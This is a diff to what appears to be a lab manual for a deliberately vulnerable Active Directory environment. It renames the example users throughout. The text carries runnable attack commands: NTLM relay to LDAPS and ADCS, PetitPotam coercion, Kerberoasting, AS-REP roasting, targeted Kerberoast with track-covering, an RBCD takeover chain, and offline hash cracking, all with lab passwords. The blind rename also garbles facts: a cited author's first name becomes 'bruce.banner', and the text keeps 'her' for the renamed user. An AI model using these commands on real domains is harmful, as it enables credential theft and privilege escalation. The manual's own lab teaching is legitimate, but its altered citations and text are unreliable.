@@ -285,7 +285,7 @@ You collect this on the wire. You **cannot replay** it (challenge is
 server-chosen) but you can crack offline. The Responder dump format is:
 
 ```
-alice::CORP:1122334455667788:5b8b34...:01010000...
+peter.parker::CORP:1122334455667788:5b8b34...:01010000...
        ^^^^   ^^^^^^^^^^^^^^^^ ^^^^^^^   ^^^^^^^^
        domain server-challenge ntproof   blob
 ```
@@ -361,7 +361,7 @@ ntlmrelayx.py -tf targets.txt -smb2support
 
 # LDAPS -> grant RBCD on target computer to attacker-owned computer
 ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access \
-              --escalate-user attacker -smb2support
+              --escalate-user loki -smb2support
 
 # HTTP -> ADCS web enrollment (ESC8) — request cert as victim
 ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
@@ -398,7 +398,7 @@ Running PetitPotam:
 
 ```bash
 # Force DC to authenticate to our IP via EfsRpcOpenFileRaw
-python3 PetitPotam.py -u alice -p 'DVADlab2024!' -d corp.local \
+python3 PetitPotam.py -u peter.parker -p 'DVADlab2024!' -d corp.local \
         attacker-ip dc01.corp.local
 ```
 
@@ -463,7 +463,7 @@ DVAD breaks every assumption in turn.
 
 ## 5.6 (Mechanics) Kerberos cast of characters
 
-- **Client / Principal** — the user (`alice@CORP.LOCAL`). Realm names are
+- **Client / Principal** — the user (`peter.parker@CORP.LOCAL`). Realm names are
   by convention uppercase versions of the DNS domain.
 - **KDC (Key Distribution Center)** — the DC. Composed of two services:
   - **AS (Authentication Server)** — issues TGTs.
@@ -501,18 +501,18 @@ RFC if you want to write parsers; otherwise impacket's `KerberosTGT` and
 Goal: client obtains a TGT.
 
 ```
-AS-REQ from alice -> KDC
+AS-REQ from peter.parker -> KDC
 {
   pvno: 5
   msg-type: AS-REQ (10)
   padata:
     PA-ENC-TIMESTAMP:
-      encrypted with alice's key (RC4 or AES):
+      encrypted with peter.parker's key (RC4 or AES):
         contents: { timestamp, microseconds }
     PA-PAC-REQUEST: include-pac=TRUE
   req-body:
     kdc-options: forwardable, renewable, ...
-    cname: alice@CORP.LOCAL
+    cname: peter.parker@CORP.LOCAL
     realm: CORP.LOCAL
     sname: krbtgt/CORP.LOCAL
     from:  optional start time
@@ -536,12 +536,12 @@ AS-REP's encrypted part is encrypted with the user's key.** Capture it →
 crack the user's password offline. That's **AS-REP roasting**.
 
 ```
-AS-REP from KDC -> alice
+AS-REP from KDC -> peter.parker
 {
   pvno: 5
   msg-type: AS-REP (11)
   crealm: CORP.LOCAL
-  cname: alice
+  cname: peter.parker
   ticket: TGT
     {
       tkt-vno: 5
@@ -554,7 +554,7 @@ AS-REP from KDC -> alice
           caddr, authorization-data: PAC
         }
     }
-  enc-part: encrypted with alice's key:
+  enc-part: encrypted with peter.parker's key:
     EncASRepPart {
       key (sk1), last-req, nonce, key-expiration, flags,
       authtime, starttime, endtime, renew-till, srealm, sname
@@ -564,12 +564,12 @@ AS-REP from KDC -> alice
 
 Two important keys:
 
-- **Alice's long-term key** (from her password) — decrypts the outer
+- **peter.parker's long-term key** (from her password) — decrypts the outer
   `enc-part`.
-- **krbtgt's key** — KDC used it to encrypt the ticket. Alice cannot read
+- **krbtgt's key** — KDC used it to encrypt the ticket. peter.parker cannot read
   inside the ticket; she just hands it back to the KDC later.
 
-The **session key (sk1)** is the new symmetric secret shared between alice
+The **session key (sk1)** is the new symmetric secret shared between peter.parker
 and the KDC for the rest of this TGT.
 
 ### Why AS-REP roast is special
@@ -623,13 +623,13 @@ Sensitive accounts (`NOT_DELEGATED` UAC bit) get TGTs without
 Goal: client trades TGT for a service ticket.
 
 ```
-TGS-REQ from alice -> KDC
+TGS-REQ from peter.parker -> KDC
 {
   msg-type: TGS-REQ (12)
   padata:
     PA-TGS-REQ:
       AP-REQ:
-        ticket: alice's TGT (encrypted with krbtgt key — KDC can decrypt)
+        ticket: peter.parker's TGT (encrypted with krbtgt key — KDC can decrypt)
         authenticator: { cname, timestamp } encrypted with sk1
   req-body:
     kdc-options: ...
@@ -646,11 +646,11 @@ KDC decrypts TGT with krbtgt key → gets sk1 → decrypts authenticator →
 verifies timestamp not stale → issues TGS.
 
 ```
-TGS-REP from KDC -> alice
+TGS-REP from KDC -> peter.parker
 {
   msg-type: TGS-REP (13)
   crealm: CORP.LOCAL
-  cname: alice
+  cname: peter.parker
   ticket: TGS
     {
       tkt-vno: 5
@@ -687,7 +687,7 @@ For AES tickets, the AES256 key is `PBKDF2-HMAC-SHA1(password, salt, 4096)`
 and cracking is PBKDF2-bound. Mode 19700 (TGS-REP AES256). Tooling:
 
 ```
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
         -request -outputfile kerb.hash
 ```
 
@@ -707,15 +707,15 @@ write on `servicePrincipalName`), you can:
 3. Optionally remove the SPN to cover tracks.
 
 ```
-bloodyAD --host dc01 -u alice -p 'DVADlab2024!' \
-         set object 'CN=Bob,CN=Users,DC=corp,DC=local' \
+bloodyAD --host dc01 -u peter.parker -p 'DVADlab2024!' \
+         set object 'CN=tony.stark,CN=Users,DC=corp,DC=local' \
          servicePrincipalName --add cifs/anything.corp.local
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
-        -request-user bob -outputfile bob.hash
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
+        -request-user tony.stark -outputfile tony.stark.hash
 bloodyAD ... remove ... cifs/anything.corp.local
 ```
 
-DVAD CRED-005 is targeted Kerberoast against a user where alice has
+DVAD CRED-005 is targeted Kerberoast against a user where peter.parker has
 GenericWrite.
 
 ---
@@ -786,8 +786,8 @@ LOGON_INFO (the meaty buffer):
 KERB_VALIDATION_INFO:
   LogonTime, LogoffTime, KickOffTime, PasswordLastSet,
   PasswordCanChange, PasswordMustChange
-  EffectiveName: "alice"
-  FullName: "Alice"
+  EffectiveName: "peter.parker"
+  FullName: "peter.parker"
   LogonScript, ProfilePath, HomeDirectory, HomeDirectoryDrive
   LogonCount, BadPasswordCount
   UserId (RID)
@@ -871,7 +871,7 @@ into the PAC for the service to consult without an LDAP round-trip.
 
 ### UPN_DNS_INFO (PAC buffer type 12)
 
-Contains the user's UPN (e.g., `alice@corp.local`) and the DNS domain
+Contains the user's UPN (e.g., `peter.parker@corp.local`) and the DNS domain
 name. This is what PKINIT-issued tickets use to map cert SAN to AD
 identity. When you forge tickets, this buffer must be present and
 consistent for many service endpoints (Exchange, ADFS) to function.
@@ -1036,14 +1036,14 @@ are the targets.
 ### A worked RBCD chain
 
 ```bash
-# Pre-req: alice has GenericWrite on TARGET$ (Bloodhound finds this)
+# Pre-req: peter.parker has GenericWrite on TARGET$ (Bloodhound finds this)
 # Step 1: create attacker computer (uses MachineAccountQuota=10)
-impacket-addcomputer corp.local/alice:'DVADlab2024!' \
+impacket-addcomputer corp.local/peter.parker:'DVADlab2024!' \
         -computer-name 'BAD$' -computer-pass 'B4dPass!' \
         -dc-ip 10.10.0.10
 
 # Step 2: set RBCD on TARGET$ to allow BAD$
-impacket-rbcd corp.local/alice:'DVADlab2024!' \
+impacket-rbcd corp.local/peter.parker:'DVADlab2024!' \
         -delegate-from 'BAD$' -delegate-to 'TARGET$' \
         -action write -dc-ip 10.10.0.10
 
@@ -1064,15 +1064,15 @@ RBCD is the most common DVAD ACL-chain payoff.
 
 ## 5.14 (Mechanics) Referrals across trusts
 
-When alice in `corp.local` wants `cifs/server.finance.local`:
+When peter.parker in `corp.local` wants `cifs/server.finance.local`:
 
 ```
-alice -> CORP KDC: TGS-REQ for cifs/server.finance.local
+peter.parker -> CORP KDC: TGS-REQ for cifs/server.finance.local
                     CORP KDC realises finance.local != CORP, returns a
                     referral TGT encrypted with the inter-realm trust key
                     krbtgt/FINANCE.LOCAL@CORP.LOCAL
 
-alice -> FINANCE KDC: TGS-REQ with the referral TGT as PA-TGS-REQ
+peter.parker -> FINANCE KDC: TGS-REQ with the referral TGT as PA-TGS-REQ
                     FINANCE KDC decrypts with its copy of the trust key
                     (krbtgt/FINANCE.LOCAL@CORP.LOCAL on FINANCE side),
                     sees PAC, applies SID filtering policy,
@@ -1164,7 +1164,7 @@ session key. Inside is `PAC_CREDENTIAL_INFO` with the user's NT hash,
 encrypted with the session key — which you have, so you decrypt:
 
 ```
-certipy auth -pfx alice.pfx -domain corp.local -dc-ip 10.10.0.10
+certipy auth -pfx peter.parker.pfx -domain corp.local -dc-ip 10.10.0.10
 # Output: ... NT hash: a4f49c40...
 ```
 
@@ -1334,11 +1334,11 @@ On Linux, Kerberos tickets are stored in **credential caches**, default
 location `/tmp/krb5cc_<uid>`. impacket tools read from `KRB5CCNAME`:
 
 ```bash
-export KRB5CCNAME=/tmp/alice.ccache
-impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
-# (writes alice.ccache by default in cwd; rename or set KRB5CCNAME)
+export KRB5CCNAME=/tmp/peter.parker.ccache
+impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+# (writes peter.parker.ccache by default in cwd; rename or set KRB5CCNAME)
 
-klist -c /tmp/alice.ccache       # inspect: which principals, lifetimes
+klist -c /tmp/peter.parker.ccache       # inspect: which principals, lifetimes
 
 impacket-psexec -k -no-pass dc01.corp.local                # uses KRB5CCNAME
 nxc smb dc01.corp.local --use-kcache                       # NetExec equivalent
@@ -1350,7 +1350,7 @@ mimikatz `kerberos::list /export`.
 To convert formats:
 
 ```bash
-ticketConverter.py alice.ccache alice.kirbi   # ccache <-> kirbi
+ticketConverter.py peter.parker.ccache peter.parker.kirbi   # ccache <-> kirbi
 ```
 
 ### The /etc/krb5.conf you'll want
@@ -1399,7 +1399,7 @@ for UDP" failure with AES tickets (very common in DVAD).
 When you've captured a ccache, you want to know what's in it:
 
 ```bash
-impacket-describeTicket alice.ccache
+impacket-describeTicket peter.parker.ccache
 ```
 
 Output (abbreviated):
@@ -1412,7 +1412,7 @@ Output (abbreviated):
     End time: 2025-... + 10h
     Renew till: 2025-... + 7d
 [*] PAC LOGON_INFO:
-    EffectiveName: alice
+    EffectiveName: peter.parker
     PrimaryGroupId: 513
     GroupIds: [513, 1107, 1213, ...]
     UserId: 1106
@@ -1546,7 +1546,7 @@ Solutions:
 The PowerShell idiom that bypasses the problem when you have plaintext:
 
 ```powershell
-$cred = New-Object PSCredential 'corp\alice',
+$cred = New-Object PSCredential 'corp\peter.parker',
         (ConvertTo-SecureString 'DVADlab2024!' -AsPlainText -Force)
 Invoke-Command -ComputerName ServerB -Credential $cred -ScriptBlock { ... }
 # Run this Invoke-Command FROM inside the WinRM session on ServerA
@@ -1561,19 +1561,19 @@ Invoke-Command -ComputerName ServerB -Credential $cred -ScriptBlock { ... }
 Filter `kerberos`. Run from your attacker box:
 
 ```bash
-impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
 ```
 
 Find the AS-REQ. Identify:
 
-- `cname` (alice).
+- `cname` (peter.parker).
 - `realm` (CORP.LOCAL).
-- `etype` (which encryption types alice's client offered).
+- `etype` (which encryption types peter.parker's client offered).
 - `padata` (the encrypted timestamp).
 - The corresponding AS-REP: `ticket.enc-part` (krbtgt-encrypted) and
-  `enc-part` (alice-encrypted, outer).
+  `enc-part` (peter.parker-encrypted, outer).
 
-Now try `impacket-getTGT corp.local/alice -hashes :a4f49c40...` and
+Now try `impacket-getTGT corp.local/peter.parker -hashes :a4f49c40...` and
 observe whether the AS-REQ etype list changes.
 
 ### Exercise 5.B — AS-REP roast
@@ -1581,7 +1581,7 @@ observe whether the AS-REQ etype list changes.
 In DVAD, certain users have `DONT_REQ_PREAUTH`. Identify them:
 
 ```bash
-impacket-GetNPUsers corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetNPUsers corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
         -request
 ```
 
@@ -1598,7 +1598,7 @@ If a user has AES-only preauth disabled (rare), `-request` returns
 ### Exercise 5.C — Kerberoast
 
 ```bash
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
         -request -outputfile kerb.hash
 hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
 ```
@@ -1613,7 +1613,7 @@ in the output format. Crack with mode 19700.
 After getting a TGT:
 
 ```bash
-impacket-describeTicket alice.ccache
+impacket-describeTicket peter.parker.ccache
 ```
 
 Find the `LogonInfo` PAC buffer. See your RID, your group memberships,
@@ -1623,11 +1623,11 @@ the PasswordLastSet timestamp.
 ### Exercise 5.E — Cross-forest referral observation
 
 ```bash
-impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
-KRB5CCNAME=alice.ccache impacket-getST \
+impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+KRB5CCNAME=peter.parker.ccache impacket-getST \
         -spn cifs/dc01.finance.local \
         -k -no-pass \
-        corp.local/alice -dc-ip 10.10.0.10
+        corp.local/peter.parker -dc-ip 10.10.0.10
 ```
 
 In Wireshark, watch for two TGS-REPs: one from CORP (the referral) and
@@ -1701,10 +1701,10 @@ Set your attacker box's clock 10 minutes off:
 
 ```bash
 sudo date -s "$(date -d '10 min ago')"
-impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
 # Should fail: KRB_AP_ERR_SKEW
 sudo ntpdate 10.10.0.10
-impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
 # Should succeed.
 ```
 
@@ -1769,7 +1769,7 @@ This 15-minute exercise saves hours of "why doesn't it work" debugging.
   ESC1..N paper).
 - **Snir Ben Shimol — *Diamond Tickets*** — the post that introduced the
   technique.
-- **Charlie Bromberg — *Pixis ticket guide*** — practical reference.
+- **bruce.banner Bromberg — *Pixis ticket guide*** — practical reference.
 - **Microsoft — KB5008380** — PAC ticket signature.
 - **Microsoft — KB5020805** — Extended KDC signature.
 - **Microsoft — KB5014754** — Strong certificate binding.
